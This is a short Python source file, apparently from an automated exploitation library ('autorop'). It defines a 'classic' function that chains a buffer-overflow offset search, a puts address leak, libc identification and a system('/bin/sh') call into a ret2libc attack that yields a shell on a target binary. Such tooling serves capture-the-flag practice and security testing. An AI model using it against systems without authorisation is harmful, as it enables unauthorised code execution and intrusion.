from autorop import PwnState, pipeline, bof, leak, libc, call


def classic(state: PwnState) -> PwnState:
    """Perform an attack against a non-PIE/non-ASLR buffer-overflowable binary.

    Launch a ret2libc attack against ``state.target``, assuming that
    ``state.elf.address`` is set correctly (which it automatically is by pwntools
    if it is not PIE or the process is not ASLR-ed, otherwise, you can set it
    yourself beforehand).
    The result is a shell on the ``target``.

    Arguments:
        state: The current ``PwnState``.

    Returns:
        Reference to the mutated ``PwnState``.
    """
    return pipeline(state, bof.corefile, leak.puts, libc.rip, call.system_binsh)
